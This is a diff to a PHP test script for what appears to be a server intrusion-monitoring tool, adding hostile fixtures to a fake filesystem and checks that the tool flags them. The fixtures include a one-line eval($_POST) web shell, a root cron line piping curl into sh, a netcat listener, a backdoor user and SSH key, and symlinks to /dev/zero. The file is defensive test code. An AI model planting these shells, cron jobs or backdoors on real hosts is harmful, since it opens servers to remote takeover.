@@ -97,6 +97,15 @@ $mkRelease('example-abc.on-forge.com', '100', [
 ]);
 $mkRelease('craftsite-xyz.on-forge.com', '7', ['craft' => '<?php', 'web/index.php' => '<?php']);
 
+// Hostile shapes a compromised site user could plant. None may hang the run.
+$rel100 = "$root/home/forge/example-abc.on-forge.com/releases/100";
+mkdir("$root/home/forge/example-abc.on-forge.com/storage/app/public", 0700, true);
+symlink('../../../storage/app/public', "$rel100/public/storage");          // Laravel's public/storage link
+symlink('.', "$rel100/public/loop");                                         // a symlink loop
+symlink('/dev/zero', "$root/home/forge/example-abc.on-forge.com/storage/logs/zero.log");
+mkdir("$root/home/backdoor/.ssh", 0700, true);
+symlink('/dev/zero', "$root/home/backdoor/.ssh/authorized_keys");
+
 // A self-signed cert that expires in 10 days.
 $key = openssl_pkey_new(['private_key_type' => OPENSSL_KEYTYPE_EC, 'curve_name' => 'prime256v1']);
 $cfgFile = "$tmp/openssl.cnf";
@@ -213,6 +222,8 @@ check('php-fpm aggregated', in_array(['user' => 'www-data', 'command' => 'php-fp
 check('patching', $st['patching']['security_updates'] === 3 && $st['patching']['reboot_required'] === true, $st['patching']);
 check('tls expiring', count($st['tls']['expiring_soon']) === 1 && $st['tls']['expiring_soon'][0]['names'] === ['example.com', 'www.example.com'], $st['tls']);
 
+check('authorized_keys symlink to /dev/zero is not read', ($o['collector']['seconds'] < 30) && $st['access_control']['authorized_keys'] === 1, $st['access_control']);
+check('log symlink to /dev/zero is skipped', !isset($o['apps']['sites']['example.com']['by_channel']['zero']), $o['apps']['sites']['example.com']['by_channel'] ?? null);
 check('state written', is_file("$tmp/state/snapshot.json") && is_file("$tmp/state/seen.json") && is_file("$tmp/state/ipmap/2026-11-07.json"));
 $map = json_decode((string) file_get_contents("$tmp/state/ipmap/2026-11-07.json"), true);
 check('ip map resolves tokens locally', in_array('203.0.113.9', $map, true));
@@ -223,6 +234,11 @@ check('state files are private', (fileperms("$tmp/state/snapshot.json") & 0077) 
 file_put_contents("$root/_commands/ss.txt", "tcp   LISTEN 0 128 0.0.0.0:4444 0.0.0.0:* users:((\"nc\",pid=6666,fd=3))\n", FILE_APPEND);
 file_put_contents("$root/home/forge/.ssh/authorized_keys", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAnotherFakeKeyForTestsOnly000000000000000000 intruder@laptop\n", FILE_APPEND);
 file_put_contents("$root/home/forge/example-abc.on-forge.com/releases/100/public/new.php", '<?php');
+file_put_contents("$root/home/forge/example-abc.on-forge.com/releases/100/public/index.php", '<?php eval($_POST["x"]);');
+file_put_contents("$root/home/forge/example-abc.on-forge.com/storage/app/public/up.php", '<?php');
+// The attacker commits new.php, so git now calls it tracked; our hashes still see it.
+file_put_contents("$root/_commands/git-ls-files-1001.txt", "public/index.php\npublic/robots.txt\npublic/new.php\n");
+file_put_contents("$root/_commands/git-head-1001.txt", "9999999999999999\n");
 file_put_contents("$root/etc/cron.d/evil", "* * * * * root curl x | sh\n");
 file_put_contents("$root/_commands/ufw-status.txt", "6379                       ALLOW       Anywhere\n", FILE_APPEND);
 file_put_contents("$root/etc/passwd", "backdoor:x:1001:1001::/home/backdoor:/bin/bash\n", FILE_APPEND);
@@ -235,7 +251,11 @@ check('key added', count($st2['access_control']['keys_added']) === 1 && $st2['ac
 check('authorized_keys file changed', in_array('/home/forge/.ssh/authorized_keys', $st2['access_control']['changed_files'], true), $st2['access_control']);
 check('user added', $st2['access_control']['users_added'] === ['backdoor'], $st2['access_control']);
 check('cron added', $st2['scheduled']['cron_added'] === ['/etc/cron.d/evil'], $st2['scheduled']);
-check('new untracked php within same release', ($st2['webroots']['findings']['example.com']['new_untracked'] ?? null) === ['public/new.php'], $st2['webroots']);
+$wr2 = $st2['webroots']['findings']['example.com'] ?? [];
+check('new php within same release, by our own hashes', ($wr2['new_executable'] ?? null) === ['public/new.php', 'public/storage/up.php'], $wr2);
+check('edited tracked php caught by hash', ($wr2['changed_executable'] ?? null) === ['public/index.php'], $wr2);
+check('HEAD moving within a release is flagged', ($wr2['head_moved_within_release'] ?? null) === true, $wr2);
+check('symlink loop does not truncate or hang', !isset($wr2['scan_truncated']), $wr2);
 check('known untracked shown as a count after first look', ($st2['webroots']['findings']['example.com']['untracked_count'] ?? null) === 2 && !isset($st2['webroots']['findings']['example.com']['untracked_executable']), $st2['webroots']);
 check('ufw rule added', $st2['firewall_rules']['added'] === ['6379 | ALLOW | Anywhere'], $st2['firewall_rules']);
 check('cpu delta since last run', $st2['processes']['since_previous_run'] === true && $st2['processes']['top_cpu'][0]['cpu_seconds'] === 0, $st2['processes']['top_cpu'][0]);
